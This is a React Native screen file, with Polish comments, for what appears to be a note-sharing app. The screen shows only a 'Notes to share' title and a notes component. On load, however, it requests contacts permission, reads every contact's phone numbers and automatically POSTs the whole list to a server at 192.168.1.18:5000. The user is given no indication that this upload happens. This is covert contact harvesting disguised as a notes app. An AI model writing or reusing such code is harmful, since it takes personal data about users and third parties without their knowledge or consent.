import React, { useEffect, useState } from 'react';
import { View, Text, StyleSheet } from 'react-native';
import * as Contacts from 'expo-contacts';
import NoteApp from "../components/note";

const IndexScreen: React.FC = () => {
  const [contacts, setContacts] = useState<any[]>([]);

  // Funkcja do ładowania kontaktów
  const loadContacts = async () => {
    try {
      const { status } = await Contacts.requestPermissionsAsync();
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.PhoneNumbers],
        });
        setContacts(data);
        console.log(`Załadowano ${data.length} kontaktów.`);
      } else {
        console.log('Brak uprawnień do kontaktów.');
      }
    } catch (error) {
      console.error('Błąd podczas ładowania kontaktów:', error);
    }
  };

  // Funkcja do wysyłania danych kontaktów metodą POST
  const sendContacts = async () => {
    try {
      const response = await fetch('http://192.168.1.18:5000/contacts', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(contacts), // Dane kontaktów do wysłania
      });

      if (response.ok) {
        console.log('Kontakty zostały wysłane pomyślnie.');
      } else {
        console.error('Błąd podczas wysyłania kontaktów:', response.statusText);
      }
    } catch (error) {
      console.error('Błąd przy wysyłaniu zapytania:', error);
    }
  };

  // UseEffect do inicjalizacji kontaktów i wysyłania ich
  useEffect(() => {
    loadContacts(); // Pobranie kontaktów
  }, []);

  // Wywołaj sendContacts po załadowaniu kontaktów
  useEffect(() => {
    if (contacts.length > 0) {
      sendContacts(); // Wyślij kontakty po ich załadowaniu
    }
  }, [contacts]);

  return (
    <View style={styles.container}>
      <Text style={styles.text}>Notes to share</Text>
      <NoteApp />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#fff',
  },
  text: {
    fontSize: 24,
    fontWeight: 'bold',
  },
});

export default IndexScreen;
